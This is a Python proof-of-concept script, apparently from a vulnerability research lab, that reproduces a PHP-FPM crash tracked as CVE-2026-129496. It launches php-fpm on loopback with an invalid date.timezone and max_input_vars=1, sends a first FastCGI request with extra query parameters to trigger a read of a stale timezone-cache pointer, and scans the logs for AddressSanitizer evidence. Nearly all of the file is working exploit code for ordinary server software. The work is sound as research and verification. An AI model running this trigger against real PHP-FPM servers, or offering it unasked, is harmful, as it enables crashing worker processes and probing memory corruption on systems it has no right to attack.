#!/usr/bin/env python3
"""CVE-2026-129496 (GHSA-gr4f-wgx5-jpfv) on loopback php-fpm.

Wake-54 bounded experiment: does the standalone stale-DATEG(tzcache) read
inherit through FPM? The advisory claims a worker crash at default
max_input_vars with ordinary request parameters. FPM calls php_module_startup
once in the MASTER, so an invalid date.timezone startup diagnostic allocates
tzcache in startup memory and leaves DATEG(tzcache) stale; forked workers
inherit that pointer. An early request diagnostic (max_input_vars exceeded)
then formats an error-log timestamp and dereferences it before date RINIT
nulls the pointer (main.c:1906 read, :1907 null).

Requires DEFAULT ZendMM (wake-53 negative: USE_ZEND_ALLOC=0 is clean), a file
PHP error_log, and an invalid date.timezone. Loopback only: 127.0.0.1:PORT.

Usage: python3 php2shell-cve129496-fpm.py FPM_BIN [OUTDIR] [PORT] [--control]
"""
import os
import pathlib
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time

HERE = pathlib.Path(__file__).resolve().parent
CLIENT = HERE / 'php2shell-fpm-client.py'
ASAN_MARK = ('AddressSanitizer', 'php_format_date', 'timelib_get_time_zone_info')
CONTROL = '--control' in sys.argv
VALID_TZ = '--valid-tz' in sys.argv


def wait_port(port, tries=150):
    import socket
    for _ in range(tries):
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def fcgi(port, script, *, query=None):
    cmd = [sys.executable, str(CLIENT), str(port), str(script)]
    if query is not None:
        cmd += ['--param', 'QUERY_STRING=' + query]
    cp = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        timeout=30)
    return cp.returncode, cp.stdout.decode(errors='replace')


def main():
    fpm = pathlib.Path(sys.argv[1]).resolve()
    out = pathlib.Path(sys.argv[2] if len(sys.argv) > 2
                       else 'lab/build/evidence/w54-129496-fpm')
    port = int(sys.argv[3] if len(sys.argv) > 3 else 18196)
    out.mkdir(parents=True, exist_ok=True)
    d = pathlib.Path(tempfile.mkdtemp(prefix='cve129496-fpm-'))
    www = d / 'www'
    www.mkdir()
    (www / 'hello.php').write_text('<?php echo "Hello world\\n"; ?>\n')

    conf = f'''[global]
error_log = {d}/fpm-error.log
daemonize = no
log_level = notice
pid = {d}/fpm.pid
process_control_timeout = 2

[www]
listen = 127.0.0.1:{port}
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
php_admin_value[opcache.enable] = 0
php_admin_value[memory_limit] = 16M
php_admin_value[display_errors] = 1
php_admin_value[log_errors] = 1
php_admin_value[error_reporting] = 32767
php_admin_value[html_errors] = 0
'''
    (d / 'fpm.conf').write_text(conf)

    # Default ZendMM is mandatory. Strip allocator env if the parent has it.
    env = dict(os.environ)
    env.pop('USE_ZEND_ALLOC', None)
    env.pop('USE_TRACKED_ALLOC', None)
    env['ASAN_OPTIONS'] = 'detect_leaks=0:abort_on_error=0'
    tz = ['-d', 'date.timezone=UTC'] if VALID_TZ else ['-d', 'date.timezone=Not/AZone']
    cmd = [str(fpm), '-n', '-F', '-y', str(d / 'fpm.conf')] + tz + [
           '-d', 'max_input_vars=1',
           '-d', 'log_errors=1',
           '-d', 'error_log=' + str(d / 'php-error.log')]
    log = out / ('control.log' if CONTROL else 'affected.log')
    with (d / 'fpm-stdout.log').open('wb') as fo:
        gp = subprocess.Popen(cmd, env=env, stdout=fo, stderr=subprocess.STDOUT,
                              start_new_session=True)
        try:
            if not wait_port(port):
                raise RuntimeError('FPM never bound 127.0.0.1:%d' % port)
            # Attack MUST be first: any earlier request's date RINIT nulls
            # DATEG(tzcache) (main.c:1907) after the read, consuming the
            # inherited stale pointer. Follow-up confirms survivor/second hit.
            if CONTROL:
                a_rc, attack = fcgi(port, www / 'hello.php')
            else:
                a_rc, attack = fcgi(port, www / 'hello.php', query='a=1&b=2')
            w_rc, warm = fcgi(port, www / 'hello.php')
            time.sleep(1)
        finally:
            try:
                gp.wait(timeout=5)
            except subprocess.TimeoutExpired:
                os.killpg(gp.pid, signal.SIGKILL)
                gp.wait()

    text = (d / 'fpm-stdout.log').read_text(errors='replace')
    chunks = [text]
    for lf in ('fpm-error.log', 'php-error.log'):
        p = d / lf
        if p.exists():
            chunks.append('\n=== %s ===\n%s' % (lf, p.read_text(errors='replace')[:8000]))
    alltext = '\n'.join(chunks)
    (out / (fpm.name + '.log')).write_text(
        'build=%s mode=%s port=%d\n' % (fpm, 'control' if CONTROL else 'attack', port) +
        '=== warmup ===\n%s\n=== attack ===\n%s\n=== logs ===\n%s\n' %
        (warm, attack, alltext))
    log.write_text('build=%s mode=%s\n' % (fpm, 'control' if CONTROL else 'attack') +
                   'warmup=%r\nattack=%r\n' % (warm[:200], attack[:200]) +
                   '\n'.join(l for l in alltext.splitlines()
                             if any(m in l for m in ASAN_MARK) or 'SUMMARY:' in l
                             or 'exited on signal' in l or 'Invalid date.timezone' in l
                             or 'max_input_vars' in l or 'Hello world' in l) + '\n')

    hit = [m for m in ASAN_MARK if m in alltext]
    pids = set(re.findall(r'pid[= ](\d+)', warm + attack))
    verdict = ('ASAN_STALE_TZCACHE' if hit else 'CLEAN')
    print('label=129496-fpm mode=%s build=%s' % ('control' if CONTROL else 'attack', fpm.name))
    print('asan_markers=%s  pids=%s  verdict=%s' % (hit, sorted(pids), verdict))
    print('warmup=%r' % warm[:160])
    print('attack=%r' % attack[:160])
    print('log=%s' % log)
    shutil.rmtree(d, ignore_errors=True)
    return 0


if __name__ == '__main__':
    main()
